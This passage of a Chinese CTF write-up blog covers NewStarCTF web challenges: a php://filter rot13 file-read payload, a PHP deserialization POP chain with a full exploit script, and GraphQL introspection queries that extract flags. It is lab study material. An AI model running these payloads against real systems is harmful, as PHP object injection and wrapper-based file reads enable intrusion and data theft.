<div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--?cuc //synt&#123;8o8q8p5n-1441-4890-o2r7-s02s9n44586s&#125;</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"></span><br><span class="line">-&gt; flag&#123;8b8d8c5a-1441-4890-b2e7-f02f9a44586f&#125;</span><br></pre></td></tr></table></figure></div>

<p>不知道flag.php如何编写才能有这种效果，若flag.php内容如下：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="comment">//flag&#123;8b8d8c5a-1441-4890-b2e7-f02f9a44586f&#125;</span></span><br><span class="line"></span><br><span class="line">-&gt;Parse error: syntax error, unexpected end of file in F:\phpstudy_pro\WWW\flag.php on line <span class="number">1</span></span><br></pre></td></tr></table></figure></div>

<p>会出现报错，改成如下内容：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="comment">//flag&#123;8b8d8c5a-1441-4890-b2e7-f02f9a44586f&#125; ?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>访问flag.php：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?file=php:<span class="comment">//filter/read=string.rot13/resource=flag.php</span></span><br><span class="line"></span><br><span class="line">-&gt; Warning: Use of undefined constant cuc - assumed <span class="string">&#x27;cuc&#x27;</span> (this will <span class="keyword">throw</span> an <span class="built_in">Error</span> in a future version of PHP) in F:\phpstudy_pro\WWW\flag.php on line <span class="number">1</span></span><br></pre></td></tr></table></figure></div>

<p>最终无法以html注释的形式获得flag。改成如下内容：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--?php <span class="comment">//flag&#123;8b8d8c5a-1441-4890-b2e7-f02f9a44586f&#125;</span></span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure></div>

<p>则不需要rot13也能直接读取到flag。不知道怎么出题！</p>
<p>参考：[</p>
<p><a class="link"   target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/266565.html" >php伪协议绕过 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ,</p>
<p><a class="link"   target="_blank" rel="noopener" href="https://www.php.net/manual/zh/filters.php" >php过滤器 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ,</p>
<p>]</p>
<h3 id="UnserializeOne"><a href="#UnserializeOne" class="headerlink" title="UnserializeOne"></a>UnserializeOne</h3><p>源码：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">#Something useful for you : https://zhuanlan.zhihu.com/p/377676274</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$func</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Welcome to NewStarCTF, &quot;</span>.<span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$var</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;func)();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sec</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$var</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">check</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;CTFers&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/flag&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Easy</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cla</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$fun</span>, <span class="variable">$var</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cla = <span class="keyword">clone</span> <span class="variable">$var</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">eeee</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__clone</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;obj-&gt;cmd))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>注释掉 <code>error_reporting(0);</code> 可查看报错</p>
<p>反序列化链：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Start</span>::<span class="title function_ invoke__">__destruct</span>()</span><br><span class="line">-&gt;<span class="title class_">Sec</span>::<span class="title function_ invoke__">__toString</span>()</span><br><span class="line">-&gt;<span class="title class_">Easy</span>::<span class="title function_ invoke__">__call</span>()</span><br><span class="line">-&gt;eeee::<span class="title function_ invoke__">__clone</span>()</span><br><span class="line">-&gt;<span class="title class_">Start</span>::<span class="title function_ invoke__">__isset</span>()</span><br><span class="line">-&gt;<span class="title class_">Sec</span>::<span class="title function_ invoke__">__invoke</span>()</span><br><span class="line">-&gt;<span class="title function_ invoke__">getFlag</span>()</span><br></pre></td></tr></table></figure></div>

<p>exp：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Easy</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$cla</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">eeee</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sec</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$var</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">chg1</span>(<span class="params"><span class="variable">$var</span></span>)</span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;obj=<span class="variable">$var</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">chg2</span>(<span class="params"><span class="variable">$var</span></span>)</span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;<span class="keyword">var</span>=<span class="variable">$var</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$func</span>;	<span class="comment">// 全部改成public</span></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">chg</span>(<span class="params"><span class="variable">$var</span></span>)</span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;func=<span class="variable">$var</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$sta1</span>=<span class="keyword">new</span> <span class="title class_">Start</span>;</span><br><span class="line"><span class="variable">$sec1</span>=<span class="keyword">new</span> <span class="title class_">Sec</span>;	</span><br><span class="line"><span class="variable">$eas1</span>=<span class="keyword">new</span> <span class="title class_">Easy</span>;</span><br><span class="line"><span class="variable">$eee1</span>=<span class="keyword">new</span> eeee;</span><br><span class="line"><span class="comment"># $sta2=new Start;	// 若有多个Start，将多次调用析构函数出现问题</span></span><br><span class="line"><span class="comment"># $sec2=new Sec;	// 多个Sec没有关系，但一个够用了</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$sta1</span>-&gt;<span class="title function_ invoke__">chg</span>(<span class="variable">$sec1</span>);	<span class="comment">// 修改保护属性func</span></span><br><span class="line"><span class="variable">$eee1</span>-&gt;obj=<span class="variable">$sta1</span>;</span><br><span class="line"><span class="variable">$sec1</span>-&gt;<span class="title function_ invoke__">chg1</span>(<span class="variable">$eas1</span>);	<span class="comment">// 私有属性不能直接更改</span></span><br><span class="line"><span class="variable">$sec1</span>-&gt;<span class="title function_ invoke__">chg2</span>(<span class="variable">$eee1</span>);	<span class="comment">// 借助公共函数进行修改</span></span><br><span class="line"><span class="variable">$sta1</span>-&gt;name=<span class="variable">$sec1</span>;</span><br><span class="line"><span class="variable">$serl</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$sta1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$serl</span>;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;serialize.txt&#x27;</span>, <span class="variable">$serl</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>写了好久的exp，反序列化时 <code>__toString()</code> 附近一直报错，问题出在两个地方：</p>
<ol>
<li>按照源码我构造序列化时，Sec类的成员函数都为私有，这会使得序列化内容与public略有不同，反序列化时读取不进去。<strong>全部改成public就解决了。</strong></li>
<li>构造链子时创建了两个Start类，析构函数调用了两次，出现了问题。<strong>本题一个就够用了，新建一个Start还需要考虑 <code>__toString</code> 的合法性。</strong></li>
</ol>
<p>未解决的问题：</p>
<ul>
<li><input checked="" disabled="" type="checkbox"> 为什么反序列化一经执行就立刻调用析构函数？<br>&#x3D;&gt; <strong>猜测：</strong> 反序列化的内容没有被存入任何变量中，反序列化得到的对象生命周期立刻就结束了，因此直接调用析构函数</li>
<li><input checked="" disabled="" type="checkbox"> <code>file_put_contents()</code> 写入序列化内容时（无中文）为什么出现乱码？<br>&#x3D;&gt; 出现乱码时序列化了”protected”属性，该类属性在序列化中会产生一些特殊字符，导致编码出现了一些问题。</li>
</ul>
<p>所得flag：flag{db75c88a-6713-4f3e-93f0-22f44dc70b93}</p>
<p>参考：[</p>
<p><a class="link"   target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/377676274" >php反序列化 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>]</p>
<h3 id="ezAPI"><a href="#ezAPI" class="headerlink" title="ezAPI"></a>ezAPI</h3><p>使用了一个数据库查询的API：GraphQL<br>快速利用工具：<a class="link"   target="_blank" rel="noopener" href="https://ivangoncharov.github.io/graphql-voyager/" >GraphQL-Voyager-在线构建工具 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，<a class="link"   target="_blank" rel="noopener" href="https://ivangoncharov.github.io/graphql-voyager/" >graphdoc-本地构建工具 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，<a class="link"   target="_blank" rel="noopener" href="https://github.com/graphql/graphql-playground" >GraphQL-Playground-本地构建工具 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，<a class="link"   target="_blank" rel="noopener" href="https://graphql.org/swapi-graphql" >在线GraphiQL <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>参考：<a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/wy_97/article/details/110522150" >渗透测试之graphQL <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，<a class="link"   target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000014131950" >30分钟理解GraphQL核心概念 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，<a class="link"   target="_blank" rel="noopener" href="https://hwlanxiaojun.github.io/2020/04/14/%E5%BD%93CTF%E9%81%87%E4%B8%8AGraphQL%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/#0x-02-%E8%AE%A4%E8%AF%86GraphQL" >当CTF遇上GraphQL的那些事 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>顺带还发现了一个非常有意思的东西：<a class="link"   target="_blank" rel="noopener" href="https://github.com/lucasbento/graphql-pokemon" >GraphQL-Pokemon <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>后台的GraphQL发包，在客户端是抓不到的。构建工具可以根据返回包中所包含的各对象的定义、接口信息将对象结构可视化展现出来（绘制出）。GraphQL-Playground工具有打包好的release文件，直接下载最新版的”setup.exe”文件即可。</p>
<p>本题有源码，访问”&#x2F;<a class="link"   target="_blank" rel="noopener" href="http://www.zip" 即可下载/">www.zip&quot;即可下载 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>尝试传入一些query，发现有用的payload：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&amp;data=&#123;&quot;query&quot;:&quot;query&#123;__type(name:\&quot;Int\&quot;)&#123;name&#125;&#125;&quot;&#125;</span><br></pre></td></tr></table></figure></div>

<p>其中的 <code>name:\&quot;Int\&quot;</code> 很有意思，换成单引号不行，去掉反斜杠也不行，换成 <code>\\\&quot;Int\\\&quot;</code> 的双重转义也不行，但是将 <code>\&quot;</code> URL编码成 <code>%5c%22</code> 后仍然可行。测试的shell是hackbar。</p>
<p>这说明hackbar上传输入框的内容时经历的过程是：先URL解码；再解析一次内容，反斜杠发生转义；再被发送给GraphQL解析一次。</p>
<p>在URL解码这一步，可以将输入框内的内容看做一整个字符串，它是不需要解析引号就能被识别的字符串（不解析引号意味着不需要反斜杠转义，也就不进行反斜杠转义），这一步会发生URL解码，解码完毕后这个字符串将去掉外面的那层“引号”，内容将被直接放入后端的php代码进行解析，我们猜测这一步得到的内容是：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1, data=&#123;&quot;query&quot;:&quot;query&#123;__type(name:\&quot;Int\&quot;)&#123;name&#125;&#125;&quot;&#125;</span><br></pre></td></tr></table></figure></div>

<p>会发现它跟我们在hackbar输入框中输入的内容是完全一致的！也就是说从前端到后端这个传输过程只会经过一层URL解码，得到的内容将被原样放入代码中解析。</p>
<p>接下来后台再来解析上述内容，由于该内容此时已经等价于编程语句，要想识别其中的字符串需要解析引号，也就是此处的双引号将被解析，反斜杠转义自然就生效，被转义的引号逃过了语法分析被视为字符串，未被转义的引号被视为字符串的分界符，因此标识符 <code>id</code> 会得到 <code>Int</code> 类型的值 <code>1</code> ，标识符 <code>data</code> 会得到 <code>json或obj或字典</code> 类型的值 <code>&#123;&quot;query&quot;:&quot;query&#123;__type(name:\&quot;Int\&quot;)&#123;name&#125;&#125;&quot;&#125;</code> ，其中属性 <code>query</code> 对应字符串 <code>query&#123;__type(name:&quot;Int&quot;)&#123;name&#125;&#125;</code> 。得到的内容作为GraphQL的query被传递出去，至此第二层解析完毕，反斜杠得到了转义。第三层解析就是正常的GraphQL解析。</p>
<p>假设情况更改为 <code>\\\&quot;Int\\\&quot;</code> 会发生什么？第一层解析先进行URL解码，得到的内容从前端被原样发到后台，PHP将对该内容进行解析——语法分析：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1, data=&#123;&quot;query&quot;:&quot;query&#123;__type(name:\\\&quot;Int\\\&quot;)&#123;name&#125;&#125;&quot;&#125;</span><br></pre></td></tr></table></figure></div>

<p>那么标识符 <code>data</code> 被赋给的值就变为了 <code>uery&#123;__type(name:\&quot;Int\&quot;)&#123;name&#125;&#125;</code> ，这个内容将被作为query原样发给GraphQL，显然GraphQL的语法并不能处理这个反斜杠（它本应只出现在引号内），因此query会失败，得到的响应会是NULL。</p>
<p>现在情况再次改变，变为 <code>&quot;Int&quot;</code> ，第一次解析去掉URL编码，PHP将面对的内容会是：<code>id=1, data=&#123;&quot;query&quot;:&quot;query&#123;__type(name:&quot;Int&quot;)&#123;name&#125;&#125;&quot;&#125;</code> ，显然 <code>&quot;query&#123;__type(name:&quot;Int&quot;)&#123;name&#125;&#125;&quot;</code> 将被识别为两个字符串中间夹着一个意义不明的 <code>Int</code> ——这显然不是PHP语法能接受的东西，不论最后这段内容被怎样处理，标识符 <code>data</code> 都将得到不合理内容，因此query将会再次失败。</p>
<p>上述的分析就是就是在剖析”转义”与”解码”的细节：</p>
<ul>
<li>是如何发生的？</li>
<li>发生在哪里？</li>
<li>什么时候发生？</li>
<li>意义是什么？</li>
</ul>
<p>这一直是一个让人头疼的地方，不论是在正则表达式中，还是在字符串解析时，一层套一层的转义，一遍又一遍的解码与编码总是让人摸不着头脑。但是现在我们知道了，hackbar输入框中的内容将会被原样传给后台，作为编程语句直接被语言解析；而在传给后台之前他将会被浏览器整个视为字符串，解析其中的URL编码后传给后端。</p>
<p>那么URL编码存在的意义又是什么？我猜想的是框中的内容其实并非直接被识别为字符串，这个过程浏览器也要进行”解析”，因此也会解析引号，为了避开这一点需要URL编码来逃逸引号等语法保留字。换句话说，所有的转义都是为了让一个shell逃逸语法关键字，对可视的内容进行语法分析，并正确且完整的提取出其中的字符串（将保留字识别为字符串而非语法要素）。当这个shell是浏览器时，逃逸的办法是进行URL编码——浏览器不认识反斜杠的转义，他当反斜杠是正常字符，但它不当百分号是正常字符，而是一个保留字，是URL编码的前缀；当shell是某个语言如PHP，那么反斜杠成了保留字，它是一个转义内容的前缀，而百分号则变为了普通字符。</p>
<p>那奇了怪了，输入内容没有进行URL编码，hackbar为什么也能正常处理？——不知道。也许是因为输入框中的内容就是直接被当做字符串的。因此我们再次更新一下对URL编码的理解，需要URL编码的是在浏览器与后端语言之间的某个shell。</p>
<p><a class="link"   target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1442847" >为什么要进行URL编码！！！ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 这篇文章就提到，传输的内容在到达PHPshell之前还需要被服务端口读取与处理，这个过程就会用到URL编码——真正需要URL编码的shell其实是服务端口，而非浏览器，浏览器的inputBox中的内容都会被直接视为字符串，它并不需要编码来分析。</p>
<p>构造内省查询payload：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&amp;data=&#123;&quot;query&quot;:&quot;query IntrospectionQuery &#123;\n  __schema &#123;\n    queryType &#123; name &#125;\n    mutationType &#123; name &#125;\n    subscriptionType &#123; name &#125;\n    types &#123;\n      ...FullType\n    &#125;\n    directives &#123;\n      name\n      description\n      locations\n      args &#123;\n        ...InputValue\n      &#125;\n    &#125;\n  &#125;\n&#125;\nfragment FullType on __Type &#123;\n  kind\n  name\n  description\n  fields(includeDeprecated: true) &#123;\n    name\n    description\n    args &#123;\n      ...InputValue\n    &#125;\n    type &#123;\n      ...TypeRef\n    &#125;\n    isDeprecated\n    deprecationReason\n  &#125;\n  inputFields &#123;\n    ...InputValue\n  &#125;\n  interfaces &#123;\n    ...TypeRef\n  &#125;\n  enumValues(includeDeprecated: true) &#123;\n    name\n    description\n    isDeprecated\n    deprecationReason\n  &#125;\n  possibleTypes &#123;\n    ...TypeRef\n  &#125;\n&#125;\nfragment InputValue on __InputValue &#123;\n  name\n  description\n  type &#123; ...TypeRef &#125;\n  defaultValue\n&#125;\nfragment TypeRef on __Type &#123;\n  kind\n  name\n  ofType &#123;\n    name\n    ofType &#123;\n      kind\n      name\n      ofType &#123;\n        kind\n        name\n        ofType &#123;\n          kind\n          name\n          ofType &#123;\n            kind\n            name\n            ofType &#123;\n              kind\n              name\n              ofType &#123;\n                kind\n                name\n              &#125;\n            &#125;\n          &#125;\n        &#125;\n      &#125;\n    &#125;\n  &#125;\n&#125;&quot;&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>IntrospectionQuery</code> 前的 <code>query%20</code> 不能省略！注意引号后面还有一个花括号。</p>
<p>graphql-voyager提供了一个根据内省查询结果还原GraphQL结构的功能”IntroSpection”。但遇到的问题是响应的内容来自PHP的 <code>var_dump()</code> 函数，该函数格式化输出了类的信息，但却又不符合类的序列化格式，得到的内容无法直接反序列化PHP中的类。</p>
<p>只能观察响应内容，发现其中有一个频繁出现的关键词：<code>ffffllllaaagggg_1n_h3r3_flag</code> ，它被定义为某个类的name，猜测它是一种类型，构造查询语句：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">query&#123;__type(name:\&quot;ffffllllaaagggg_1n_h3r3_flag\&quot;)&#123;name\nfields&#123;name&#125;&#125;&#125;</span><br><span class="line"></span><br><span class="line">=&gt; </span><br><span class="line">DEBUG: object(stdClass)#3 (1) &#123; [&quot;__type&quot;]=&gt; object(stdClass)#1 (2) &#123; [&quot;name&quot;]=&gt; string(28) &quot;ffffllllaaagggg_1n_h3r3_flag&quot; [&quot;fields&quot;]=&gt; array(1) &#123; [0]=&gt; object(stdClass)#2 (1) &#123; [&quot;name&quot;]=&gt; string(4) &quot;flag&quot; &#125; &#125; &#125; &#125;</span><br></pre></td></tr></table></figure></div>

<p>会发现它有一个flag字段，查询flag：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">query&#123;ffffllllaaagggg_1n_h3r3_flag&#123;flag&#125;&#125;</span><br><span class="line"></span><br><span class="line">=&gt;</span><br><span class="line">DEBUG: object(stdClass)#2 (1) &#123; [&quot;ffffllllaaagggg_1n_h3r3_flag&quot;]=&gt; array(1) &#123; [0]=&gt; object(stdClass)#1 (1) &#123; [&quot;flag&quot;]=&gt; string(42) &quot;flag&#123;4a902c8e-a8b5-ecfb-bee3-d6419865647c&#125;&quot; &#125; &#125; &#125;</span><br></pre></td></tr></table></figure></div>

<p>非常的奇妙，我还不是很理解graphql的语法，不知道直接查询一个类型为什么能查出东西来&#x3D; &#x3D;，总之flag放在 <code>ffffllllaaagggg_1n_h3r3_flag&#123;flag&#125;</code> 中，直接query查询即可获得：<code>flag&#123;4a902c8e-a8b5-ecfb-bee3-d6419865647c&#125;</code></p>
<p>还没完，结束了才想到可以不用内省查询，直接查找graphql已有的类型：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query&#123;__schema&#123;types&#123;name&#125;&#125;&#125;</span><br></pre></td></tr></table></figure></div>

<p>会发现有52个类型，里面就有”ffffllllaaagggg_1n_h3r3_flag”以及它的许多兄弟姐妹类型。</p>
<p>一张定制的表可以作为类型去定义其他表的成员，因此非内置类型的名字往往就是某一类表的类名，这类表实例化后归属于该类名，查询时提供查询条件，查询类名与关键字，就会根据特定的信息查询出类名下符合条件的实例表，并将关键字信息返回。因此查询类名可能就是在检索该类名下所有实例的关键字内容。</p>
<hr>
<h4 id="Tips："><a href="#Tips：" class="headerlink" title="Tips："></a>Tips：</h4><ul>
<li>浏览器的地址栏可以执行js代码，如使用 <code>javascript:location.href</code> 将会返回当前访问的网址未被各种编码处理之前的模样。<br><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43363773/article/details/105127260" >JS BOM操作地址栏、浏览器信息 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 提供了一些操作指导。<br>有一个很类似的payload能读取到页面源码：<code>view-source:URL</code> ，浏览器地址栏真是个神奇的box。</li>
<li>当使用”html格式编辑内容”时，网页上的一些字符会出现变化，如大于号 <code>&gt;</code> 会变成 <code>&amp;gt</code> ，因此箭头 <code>=&gt;</code> 就会变成 <code>=&amp;gt</code></li>
</ul>
<h4 id="词本"><a href="#词本" class="headerlink" title="词本"></a>词本</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Implements: cn.接口,工具</span><br><span class="line">filed: cn.字段</span><br></pre></td></tr></table></figure></div>

